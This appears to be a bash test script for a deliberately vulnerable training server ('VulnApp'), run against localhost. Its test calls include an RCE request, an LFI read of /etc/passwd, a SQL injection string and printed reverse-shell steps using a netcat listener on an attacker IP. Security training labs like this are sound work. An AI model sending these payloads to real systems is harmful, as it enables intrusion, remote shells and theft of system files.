#!/bin/bash
# VulnApp v2.0 - Quick API Testing Guide
# Run this after the server is started

echo "=========================================="
echo "  VulnApp v2.0 - API Quick Test"
echo "=========================================="
echo ""

# Detect server URL
SERVER_URL=""
if curl -s http://localhost/api/health > /dev/null 2>&1; then
    SERVER_URL="http://localhost"
elif curl -s http://localhost:8080/api/health > /dev/null 2>&1; then
    SERVER_URL="http://localhost:8080"
elif curl -s http://localhost:80/api/health > /dev/null 2>&1; then
    SERVER_URL="http://localhost:80"
fi

if [ -z "$SERVER_URL" ]; then
    echo "❌ Server not detected on ports 80 or 8080"
    echo ""
    echo "To start the server:"
    echo "  sudo go run . -port 80"
    echo ""
    echo "Or in Docker:"
    echo "  docker run -p 80:80 vulnapp:2.0"
    exit 1
fi

echo "✅ Server detected at: $SERVER_URL"
echo ""

# Test 1: Health Check
echo "🔍 Test 1: Health Check"
echo "GET $SERVER_URL/api/health"
curl -s $SERVER_URL/api/health | jq '.'
echo ""

# Test 2: List All Attacks
echo "🔍 Test 2: List All Attacks"
echo "GET $SERVER_URL/api/attacks"
curl -s $SERVER_URL/api/attacks | jq '.count, .attacks[0:3] | .[] | {id, name, category, severity}'
echo "..."
echo ""

# Test 3: Get Specific Attack
echo "🔍 Test 3: Get Specific Attack"
echo "GET $SERVER_URL/api/attacks/docker-socket-exploitation"
curl -s $SERVER_URL/api/attacks/docker-socket-exploitation | jq '{id, name, category, severity, mitre_techniques}'
echo ""

# Test 4: Execute Attack
echo "🔍 Test 4: Execute Attack"
echo "POST $SERVER_URL/api/attacks/execution-cli/execute"
EXEC_RESPONSE=$(curl -s -X POST $SERVER_URL/api/attacks/execution-cli/execute)
echo "$EXEC_RESPONSE" | jq '.'
EXEC_ID=$(echo "$EXEC_RESPONSE" | jq -r '.execution_id')
echo ""

# Test 5: Check Execution Status
if [ -n "$EXEC_ID" ] && [ "$EXEC_ID" != "null" ]; then
    echo "🔍 Test 5: Check Execution Status"
    echo "GET $SERVER_URL/api/executions/$EXEC_ID"
    sleep 2  # Give it time to complete
    curl -s $SERVER_URL/api/executions/$EXEC_ID | jq '{id, attack_id, status, exit_code, duration}'
    echo ""
fi

# Test 6: System Info
echo "🔍 Test 6: System Info"
echo "GET $SERVER_URL/api/system/info"
curl -s $SERVER_URL/api/system/info | jq '.'
echo ""

# Test 7: Vulnerable RCE Endpoint
echo "🔍 Test 7: Vulnerable RCE Endpoint (whoami)"
echo "GET $SERVER_URL/api/vulnerable/rce?cmd=whoami"
curl -s "$SERVER_URL/api/vulnerable/rce?cmd=whoami"
echo ""
echo ""

# Test 8: Vulnerable LFI Endpoint
echo "🔍 Test 8: Vulnerable LFI Endpoint (/etc/passwd)"
echo "GET $SERVER_URL/api/vulnerable/lfi?file=/etc/passwd"
curl -s "$SERVER_URL/api/vulnerable/lfi?file=/etc/passwd" | head -5
echo "..."
echo ""

# Test 9: SQL Injection
echo "🔍 Test 9: SQL Injection Simulation"
echo "GET $SERVER_URL/api/vulnerable/sqli?search=' OR '1'='1"
curl -s "$SERVER_URL/api/vulnerable/sqli?search=' OR '1'='1" | jq '.'
echo ""

echo "=========================================="
echo "  Interactive Tests"
echo "=========================================="
echo ""
echo "🎯 Reverse Shell Test (requires attacker machine):"
echo ""
echo "1. On your attacker machine (e.g., 192.168.1.100):"
echo "   nc -lvnp 4444"
echo ""
echo "2. Execute reverse shell:"
echo "   curl -X POST $SERVER_URL/api/vulnerable/reverse-shell \\"
echo "     -H 'Content-Type: application/json' \\"
echo "     -d '{\"attacker_ip\":\"192.168.1.100\",\"port\":\"4444\"}'"
echo ""
echo "3. Check your netcat listener for connection!"
echo ""

echo "=========================================="
echo "  WebSocket Test"
echo "=========================================="
echo ""
echo "To test WebSocket streaming, use a WebSocket client:"
echo ""
echo "1. Execute attack to get execution_id:"
echo "   EXEC_ID=\$(curl -s -X POST $SERVER_URL/api/attacks/execution-cli/execute | jq -r '.execution_id')"
echo ""
echo "2. Connect WebSocket:"
echo "   wscat -c ws://localhost/api/executions/\$EXEC_ID/stream"
echo ""
echo "   (Install wscat: npm install -g wscat)"
echo ""

echo "=========================================="
echo "  All API Endpoints"
echo "=========================================="
echo ""
echo "REST API:"
echo "  GET  $SERVER_URL/api/attacks"
echo "  GET  $SERVER_URL/api/attacks/:id"
echo "  POST $SERVER_URL/api/attacks/:id/execute"
echo "  GET  $SERVER_URL/api/executions"
echo "  GET  $SERVER_URL/api/executions/:id"
echo "  GET  $SERVER_URL/api/executions/:id/stream (WebSocket)"
echo "  GET  $SERVER_URL/api/health"
echo "  GET  $SERVER_URL/api/system/info"
echo ""
echo "Vulnerable Endpoints (Training Only!):"
echo "  GET  $SERVER_URL/api/vulnerable/rce?cmd=<command>"
echo "  GET  $SERVER_URL/api/vulnerable/lfi?file=<path>"
echo "  POST $SERVER_URL/api/vulnerable/reverse-shell"
echo "  GET  $SERVER_URL/api/vulnerable/sqli?search=<query>"
echo ""

echo "✅ API testing complete!"
